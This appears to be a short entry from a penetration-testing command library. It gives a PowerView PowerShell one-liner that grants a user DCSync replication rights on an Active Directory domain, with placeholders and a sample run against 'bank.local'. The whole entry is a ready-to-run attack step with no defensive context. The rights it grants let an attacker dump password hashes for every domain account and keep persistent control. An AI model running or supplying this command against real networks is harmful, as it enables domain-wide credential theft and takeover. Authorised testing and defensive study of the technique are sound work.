---
id: 9b62eb9b-123c-4268-a595-d73b8d2b0fae
name: PowerView Add DCSync Rights to a User
type: command
executor: powershell
data: Add-DomainObjectAcl  -Rights DCSync -TargetDomain $_DOMAIN -PrincipalIdentity
  $_USER -Credential $Cred
output: PS C:\> Add-DomainObjectAcl  -Rights DCSync -TargetDomain bank.local -PrincipalIdentity
  service -Credential $Cred
created_at: '2020-03-16T00:35:46.225770+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[PowerView]]'
- '[[ps]]'
---

# PowerView Add DCSync Rights to a User

```powershell
Add-DomainObjectAcl  -Rights DCSync -TargetDomain $_DOMAIN -PrincipalIdentity $_USER -Credential $Cred
```

## Expected Output

```
PS C:\> Add-DomainObjectAcl  -Rights DCSync -TargetDomain bank.local -PrincipalIdentity service -Credential $Cred
```


